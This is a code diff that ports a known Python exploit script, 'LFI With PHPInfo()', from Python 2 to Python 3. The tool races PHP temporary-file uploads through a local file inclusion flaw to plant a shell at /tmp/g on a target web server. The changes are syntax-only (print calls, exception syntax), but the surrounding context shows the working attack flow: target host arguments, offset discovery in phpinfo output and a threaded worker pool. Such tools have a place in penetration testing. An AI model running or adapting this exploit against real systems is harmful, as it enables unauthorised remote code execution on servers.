@@ -1,5 +1,7 @@
 #!/usr/bin/python
 # https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+from __future__ import print_function
+from builtins import range
 import sys
 import threading
 import socket
@@ -83,7 +85,7 @@ class ThreadWorker(threading.Thread):
                 if self.event.is_set():
                     break
                 if x:
-                    print "\nGot it! Shell created in /tmp/g"
+                    print("\nGot it! Shell created in /tmp/g")
                     self.event.set()
 
             except socket.error:
@@ -110,23 +112,23 @@ def getOffset(host, port, phpinforeq):
     if i == -1:
         raise ValueError("No php tmp_name in phpinfo output")
 
-    print "found %s at %i" % (d[i:i+10],i)
+    print("found %s at %i" % (d[i:i+10],i))
     # padded up a bit
     return i+256
 
 def main():
 
-    print "LFI With PHPInfo()"
-    print "-=" * 30
+    print("LFI With PHPInfo()")
+    print("-=" * 30)
 
     if len(sys.argv) < 2:
-        print "Usage: %s host [port] [threads]" % sys.argv[0]
+        print("Usage: %s host [port] [threads]" % sys.argv[0])
         sys.exit(1)
 
     try:
         host = socket.gethostbyname(sys.argv[1])
-    except socket.error, e:
-        print "Error with hostname %s: %s" % (sys.argv[1], e)
+    except socket.error as e:
+        print("Error with hostname %s: %s" % (sys.argv[1], e))
         sys.exit(1)
 
     port=80
@@ -134,8 +136,8 @@ def main():
         port = int(sys.argv[2])
     except IndexError:
         pass
-    except ValueError, e:
-        print "Error with port %d: %s" % (sys.argv[2], e)
+    except ValueError as e:
+        print("Error with port %d: %s" % (sys.argv[2], e))
         sys.exit(1)
 
     poolsz=10
@@ -143,11 +145,11 @@ def main():
         poolsz = int(sys.argv[3])
     except IndexError:
         pass
-    except ValueError, e:
-        print "Error with poolsz %d: %s" % (sys.argv[3], e)
+    except ValueError as e:
+        print("Error with poolsz %d: %s" % (sys.argv[3], e))
         sys.exit(1)
 
-    print "Getting initial offset...",
+    print("Getting initial offset...", end=' ')
     reqphp, tag, reqlfi = setup(host, port)
     offset = getOffset(host, port, reqphp)
     sys.stdout.flush()
@@ -156,7 +158,7 @@ def main():
     e = threading.Event()
     l = threading.Lock()
 
-    print "Spawning worker pool (%d)..." % poolsz
+    print("Spawning worker pool (%d)..." % poolsz)
     sys.stdout.flush()
 
     tp = []
@@ -174,19 +176,19 @@ def main():
                 sys.stdout.flush()
                 if counter >= maxattempts:
                     break
-        print
+        print()
         if e.is_set():
-            print "Woot!  \m/"
+            print("Woot!  \m/")
         else:
-            print ":("
+            print(":(")
     except KeyboardInterrupt:
-        print "\nTelling threads to shutdown..."
+        print("\nTelling threads to shutdown...")
         e.set()
 
-    print "Shuttin' down..."
+    print("Shuttin' down...")
     for t in tp:
         t.join()
 
 if __name__=="__main__":
-    print "Don't forget to modify the LFI URL"
+    print("Don't forget to modify the LFI URL")
     main()
